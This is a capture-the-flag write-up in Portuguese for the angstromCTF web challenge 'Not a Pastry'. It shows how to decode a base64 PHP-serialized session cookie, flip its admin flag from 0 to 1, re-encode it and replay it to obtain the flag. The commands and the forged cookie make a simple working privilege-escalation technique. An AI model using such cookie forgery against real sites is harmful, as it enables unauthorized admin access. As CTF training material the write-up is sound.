Not a Pastry(web,40)
HINT: ferramentas de desenvolvimento deve ajudar.

Nós descobrimos um site misterioso[http://web.angstromctf.com:1339/]. você pode recuperar a bandeira?
Quando você acessar a página do link, será mostrado: You're not admin! Sorry :(

[RESOLVING]
Significa que você tem que estar ali como admin, bom não tem formulário nem nada para autenticação
É claro que temos que escalar privilégios  via cookie então ou trocar o user-agent, mas nesse exemplo temos apenas que editar o cookie..
podemos verificar e usar o LiveHTTP headers para isso também :)

Vamos usar o Cookies Manager+ para isso e ver o cookie:

Cookie: not_a_pastry=Tzo3OiJTZXNzaW9uIjoyOntzOjEwOiJzdGFydF90aW1lIjtpOjE0NjM3NjQwMDU7czo1OiJhZG1pbiI7YjowO30%3D

Vamos logo que temos uma possivel base64, então vamos reverter ela(troque p %3D por = ):
Terminal-> echo "Tzo3OiJTZXNzaW9uIjoyOntzOjEwOiJzdGFydF90aW1lIjtpOjE0NjM3NjQwMDU7czo1OiJhZG1pbiI7YjowO30=\n" | base64 -d
Teremos então : O:7:"Session":2:{s:10:"start_time";i:1463764005;s:5:"admin";b:0;}

Bom você poderia tentar varias alterações porém ja está setado o user admin no cookie, então porque o site diz que não sou!? WTF ??
Haha simples ... quem conhece sistemas administrativos, paineis de admin de sites etc sabe que ha um nivel de acesso de usuários os
quais são denominados por numeros ex:[0: inativo, 1:ativo, 2:bloqueado ou então 0:desativado, 1:admin, 2:operador, 3:editor...] bom
logo vemos que somos o "0" nesta sessão ("admin";b:0;) o que significa que devemos alterar isso trocando o 0 por 1 ;)

Teremos: O:7:"Session":2:{s:10:"start_time";i:1463764005;s:5:"admin";b:1;} e passamos isso para base64 novamente
Terminal-> echo "O:7:"Session":2:{s:10:"start_time";i:1463764005;s:5:"admin";b:1;}" | base64
Base64-> Tzo3OiJTZXNzaW9uIjoyOntzOjEwOiJzdGFydF90aW1lIjtpOjE0NjM3NjQwMDU7czo1OiJhZG1pbiI7YjoxO30=

Basta trocar o cookie no liveHTTP e dar Reply ou no cookie manager, salvar e dar F5 e teremos a flag.

Congratulations!
Your flag is: good_ole_fashioned_homemade_cookies